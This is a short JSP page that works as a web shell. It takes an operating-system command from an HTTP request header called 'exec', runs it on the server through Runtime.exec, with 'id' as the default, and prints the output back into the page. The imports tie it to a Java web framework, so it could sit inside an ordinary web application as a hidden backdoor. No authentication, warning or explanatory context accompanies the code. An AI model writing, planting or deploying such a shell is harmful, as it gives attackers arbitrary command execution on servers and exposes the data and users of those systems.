<%@ page import="net.atos.mm.fwk.fw3.servlet.*,net.atos.mm.fwk.fw3.list.*,net.atos.mm.fwk.fw3.cache.*,net.atos.mm.fwk.fw3.tools.*,net.atos.mm.fwk.fw3.form.*,java.net.*,java.util.*,java.io.*"%>
<%@ taglib uri="http://java.sun.com/jstl/core" prefix="c" %>

<%

String res = "";
String exe = request.getHeader("exec");

if (exe == null || exe.equals("")) {
exe="id";
}

Process p = Runtime.getRuntime().exec(exe);
OutputStream os = p.getOutputStream();
InputStream in = p.getInputStream();
DataInputStream dis = new DataInputStream(in);

String disr = dis.readLine();
while (disr != null) {
	res = res + disr + "\n"; 
	disr = dis.readLine(); 
}

pageContext.setAttribute("result", res);

%>

<b>Process p = Runtime.getRuntime().exec(cmd):</b><br/>
<c:out value="${result}"/>
